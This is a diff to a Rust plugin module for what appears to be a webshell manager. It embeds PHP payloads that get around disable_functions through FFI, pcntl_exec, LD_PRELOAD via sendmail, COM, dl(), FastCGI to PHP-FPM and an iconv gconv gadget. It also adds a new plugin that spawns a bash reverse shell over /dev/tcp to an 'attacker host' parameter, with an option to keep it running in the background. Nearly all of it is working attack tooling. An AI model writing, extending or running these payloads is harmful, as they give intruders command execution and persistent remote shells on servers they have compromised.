@@ -69,7 +69,7 @@ $detected = array();
 foreach ($fns as $fn) { $detected[$fn] = $has($fn); }
 $compiler = null;
 foreach (array('gcc','cc','clang') as $c) {
-    $p = @shell_exec('command -v ' . $c . ' 2>/dev/null');
+    $p = function_exists('shell_exec') ? @shell_exec('command -v ' . $c . ' 2>/dev/null') : false;
     if (trim((string)$p)) { $compiler = trim($p); break; }
 }
 $sendmail = (string)ini_get('sendmail_path');
@@ -251,7 +251,7 @@ foreach (array('libc.so.6', 'libc.so', '/lib/x86_64-linux-gnu/libc.so.6', '/usr/
 }}
 if ($lib === null) {{
     echo json_encode(array('ok' => false, 'error' => 'FFI 不可用或无法加载 libc（需 PHP 7.4+ 且 ffi.enable=1）'));
-    exit;
+    return;
 }}
 try {{
     $fp = $ffi->popen($cmd . ' 2>&1', 'r');
@@ -322,7 +322,7 @@ if (function_exists('pcntl_fork') && function_exists('pcntl_exec') && function_e
     $pid = pcntl_fork();
     if ($pid === 0) {{
         pcntl_exec('/bin/sh', array('-c', $cmd . ' > ' . $of . ' 2>&1'));
-        exit;
+        return;
     }}
     if ($pid > 0) {{
         pcntl_waitpid($pid, $status);
@@ -331,7 +331,7 @@ if (function_exists('pcntl_fork') && function_exists('pcntl_exec') && function_e
         $ok = true;
         echo json_encode(array('ok' => true, 'pid' => $pid,
             'output' => base64_encode((string)$output), 'output_text' => (string)$output));
-        exit;
+        return;
     }}
 }}
 echo json_encode(array('ok' => false, 'error' => 'pcntl_exec/pcntl_fork/pcntl_waitpid 不可用'));
@@ -411,7 +411,7 @@ $disabled = array_map('trim', explode(',', (string)ini_get('disable_functions'))
 $has = function ($fn) use ($disabled) {{ return function_exists($fn) && !in_array($fn, $disabled); }};
 $cc = null;
 foreach (array('gcc', 'cc', 'clang') as $c) {{
-    $p = @shell_exec('command -v ' . $c . ' 2>/dev/null');
+    $p = function_exists('shell_exec') ? @shell_exec('command -v ' . $c . ' 2>/dev/null') : false;
     if (trim((string)$p)) {{ $cc = trim($p); break; }}
 }}
 $sendmail = (string)ini_get('sendmail_path');
@@ -420,7 +420,7 @@ $hasSendmail = @is_executable($sendmail) || @file_exists($sendmail);
 if (!$cc || !$has('putenv') || !($has('mail') || $has('error_log')) || !$hasSendmail) {{
     echo json_encode(array('ok' => false,
         'error' => '缺少条件：编译器(' . ($cc ?: '无') . ') putenv(' . ($has('putenv') ? '有' : '无') . ') sendmail(' . ($hasSendmail ? '有' : '无') . ')'));
-    exit;
+    return;
 }}
 $so = $tmp . '/.dsw_' . mt_rand() . '_' . mt_rand() . '.so';
 $cf = $tmp . '/.dsw_' . mt_rand() . '_' . mt_rand() . '.c';
@@ -431,7 +431,7 @@ C;
 $built = @shell_exec($cc . ' -shared -fPIC -O2 -o ' . $so . ' ' . $cf . ' 2>&1');
 if (!file_exists($so)) {{
     echo json_encode(array('ok' => false, 'error' => '编译失败：' . (string)$built));
-    exit;
+    return;
 }}
 @putenv('EVIL_CMD=' . $cmd . ' > ' . $of . ' 2>&1');
 @putenv('LD_PRELOAD=' . $so);
@@ -492,7 +492,7 @@ $cmd = {cmd};
 $of = "{out}";
 if (PHP_OS_FAMILY !== 'Windows' || !class_exists('COM')) {{
     echo json_encode(array('ok' => false, 'error' => '需 Windows + PHP COM 扩展'));
-    exit;
+    return;
 }}
 try {{
     $wsh = new COM('WScript.Shell');
@@ -631,11 +631,11 @@ error_reporting(0);
 $ext = {ext};
 if (!function_exists('dl')) {{
     echo json_encode(array('ok' => false, 'error' => 'dl() 不存在（现代 PHP 仅 CLI/embed 可用）'));
-    exit;
+    return;
 }}
 if ($ext === '') {{
     echo json_encode(array('ok' => false, 'error' => '请填写扩展 .so 路径（如 /usr/lib/php/xxx.so）'));
-    exit;
+    return;
 }}
 $ok = @dl($ext);
 echo json_encode(array('ok' => $ok, 'extension' => $ext,
@@ -720,7 +720,7 @@ foreach ($sockets as $s) {{
 }}
 if ($found === null) {{
     echo json_encode(array('ok' => false, 'error' => '未发现可连接的 FPM socket/端口'));
-    exit;
+    return;
 }}
 // FCGI 协议
 function fcgi_pack($type, $content, $reqid = 1) {{
@@ -833,18 +833,18 @@ $cmd = {cmd};
 $of = "{out}";
 if (PHP_VERSION_ID >= 70300) {{
     echo json_encode(array('ok' => false, 'error' => '该向量针对 PHP 7.0-7.2（当前 ' . PHP_VERSION . '）'));
-    exit;
+    return;
 }}
 $disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
 $has = function ($fn) use ($disabled) {{ return function_exists($fn) && !in_array($fn, $disabled); }};
 $cc = null;
 foreach (array('gcc', 'cc', 'clang') as $c) {{
-    $p = @shell_exec('command -v ' . $c . ' 2>/dev/null');
+    $p = function_exists('shell_exec') ? @shell_exec('command -v ' . $c . ' 2>/dev/null') : false;
     if (trim((string)$p)) {{ $cc = trim($p); break; }}
 }}
 if (!$cc || !$has('iconv') || !$has('putenv')) {{
     echo json_encode(array('ok' => false, 'error' => '缺少条件：编译器/iconv/putenv'));
-    exit;
+    return;
 }}
 $base = sys_get_temp_dir() . '/.dsw_gc_' . mt_rand();
 @mkdir($base);
@@ -860,7 +860,7 @@ C;
 $built = @shell_exec($cc . ' -shared -fPIC -o ' . $so . ' ' . $src . ' 2>&1');
 if (!file_exists($so)) {{
     echo json_encode(array('ok' => false, 'error' => '编译失败：' . (string)$built));
-    exit;
+    return;
 }}
 $mod = "module PAYLOAD// INTERNAL ../gconv/gconv-modules.so 2\n";
 $alias = "alias PAYLOAD// X11//\n";
@@ -884,6 +884,114 @@ echo json_encode(array('ok' => strlen((string)$output) > 0 || $r !== false,
             out = BYPASS_OUT,
         )
         .replace("__C__", ICONV_GADGET_C);
+        run_payload(protocol, session, &code, settings)
+    }
+}
+
+// ---------------------------------------------------------------------------
+// 向量 10：bypass_reverse_pcntl —— pcntl 反弹 shell（proc_open 被禁场景）
+// ---------------------------------------------------------------------------
+
+pub struct BypassReversePcntlPlugin;
+
+impl FeaturePlugin for BypassReversePcntlPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "bypass_reverse_pcntl".into(),
+            name: "Bypass·pcntl 反弹".into(),
+            version: "1.0.0".into(),
+            description: "fork + pcntl_exec 反弹 bash（不依赖 proc_open/shell_exec，命令函数全禁时可用）。".into(),
+            category: "php".into(),
+            languages: vec!["php".into()],
+            params: vec![
+                ParamSpec {
+                    name: "host".into(),
+                    label: "攻击机地址".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("127.0.0.1")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "port".into(),
+                    label: "攻击机监听端口".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(4444)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "background".into(),
+                    label: "后台驻留".into(),
+                    param_type: "bool".into(),
+                    default: Some(serde_json::json!(true)),
+                    options: None,
+                },
+            ],
+            kind: "loader".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        if runtime != "php" {
+            return Err(ProtocolError::NotSupported("仅支持 php".into()));
+        }
+        let host = params
+            .get("host")
+            .and_then(|v| v.as_str())
+            .unwrap_or("127.0.0.1")
+            .to_string();
+        let port = params
+            .get("port")
+            .and_then(|v| v.as_u64())
+            .unwrap_or(4444)
+            .clamp(1, 65535);
+        let background = params
+            .get("background")
+            .and_then(|v| v.as_bool())
+            .unwrap_or(true);
+        let code = format!(
+            r#"<?php
+set_time_limit(0);
+error_reporting(0);
+$host = {host};
+$port = {port};
+$cmd = '/bin/bash -i >& /dev/tcp/' . $host . '/' . $port . ' 0>&1';
+if (!function_exists('pcntl_fork') || !function_exists('pcntl_exec')) {{
+    echo json_encode(array('ok' => false, 'error' => 'pcntl_fork/pcntl_exec 不可用'));
+    return;
+}}
+$pid = pcntl_fork();
+if ($pid === 0) {{
+    if (function_exists('posix_setsid')) @posix_setsid();
+    // 子进程：exec 替换为反弹 bash
+    pcntl_exec('/bin/sh', array('-c', $cmd));
+    // 降级：直接 /bin/bash -i
+    pcntl_exec('/bin/bash', array('-c', '/bin/bash -i'));
+    return;
+}}
+if ($pid > 0) {{
+    if ({background}) {{
+        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid,
+            'connect' => $host . ':' . $port, 'command' => $cmd));
+        return;
+    }}
+    // 前台：等待子进程结束（反弹连接断开后返回）
+    pcntl_waitpid($pid, $status);
+    echo json_encode(array('ok' => true, 'mode' => 'foreground', 'pid' => $pid));
+    return;
+}}
+echo json_encode(array('ok' => false, 'error' => 'fork 失败'));
+"#,
+            host = serde_json::to_string(&host).unwrap_or_else(|_| "\"127.0.0.1\"".to_string()),
+            port = port,
+            background = if background { "true" } else { "false" },
+        );
         run_payload(protocol, session, &code, settings)
     }
 }
